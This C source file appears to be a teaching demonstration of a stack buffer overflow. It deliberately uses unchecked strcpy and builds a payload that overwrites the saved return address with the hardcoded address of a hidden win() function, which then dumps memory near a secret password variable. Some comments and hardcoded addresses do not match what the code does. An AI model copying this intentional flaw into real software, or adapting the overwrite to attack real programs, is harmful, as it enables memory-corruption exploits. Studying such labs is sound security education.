#include <stdio.h>
#include <string.h>
#include <stdlib.h>

extern char account_money; // Simulating a global variable that holds the account balance

char password[16];
char admin_privilege = 0; // '0' for No, '1' for Yes
char account_money = 0;

void win();
void vulnerable_function(char *str);

/* This function is never called directly by the program.
   The goal of control hijacking is to force the CPU to execute it. */
void win() {
    printf("\n[!] Control Hijack Successful!\n");
    printf("[!] Redirected execution flow to win() function.\n");

    printf("the address of the password variable is: %p\n", password);

    unsigned char *ptr = (unsigned char *)0x000000000040d040; // Get the address of account_money

    for (int i = 0; i < 20; i++) {
        printf("Byte %d of password: 0x%c\n", i, *(ptr+i));
    }
    exit(0);
}

void vulnerable_function(char *str) {
    char buffer[64];

    strncpy(password, "SECRET_PASS_123", sizeof(password));

    /* DANGER: strcpy does not check bounds. 
       Providing an input longer than 64 bytes will overwrite the 
       stack frame, including the saved Return Address. */
    // strncpy(buffer, str, sizeof(buffer));
    strcpy(buffer, str);
    printf("Buffer content: %s\n", buffer);

    //doing something with the buffer to prevent optimization

    strncpy(buffer, "\x00", sizeof(buffer)); // Attempt to clear the buffer from memory
}

int main(int argc, char **argv) {
    if (argc > 1) {
        /* Run with user-provided command line argument: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0\x94\x15\x40\x00\x00\x00\x00\x00*/
        vulnerable_function(argv[1]);
    } else {
        /* Default exploit demonstration payload */
        /* Instruction: Use the win function pointer 0x0000000000401594 directly.
           We construct a payload that fills the 64-byte buffer, overwrites 
           the base pointer (8 bytes on x64), and then overwrites the 
           return address with the address of win(). */

        printf("the address of win() is: %p\n\n\n\n\n\n", win); // Print the address of win() to help construct the payload
        
        char payload[81];
        // memset(payload, 'A', 64); // Fill buffer (64) + saved RBP (8) (EBP is 4 bytes on x86, RBP is 8 bytes on x64, EBP means stack base pointer, RBP is the 64-bit version of it)
        memset(payload, 'A', 72); // Fill buffer (64) + saved RBP (8) (EBP is 4 bytes on x86, RBP is 8 bytes on x64, EBP means stack base pointer, RBP is the 64-bit version of it)
        memcpy(payload + 72, "\x94\x15\x40\x00\x00\x00\x00\x00", 8); // Address of win()
        payload[80] = '\0';

        vulnerable_function(payload);
    }

    printf("Program exited normally.\n");
    return 0;
}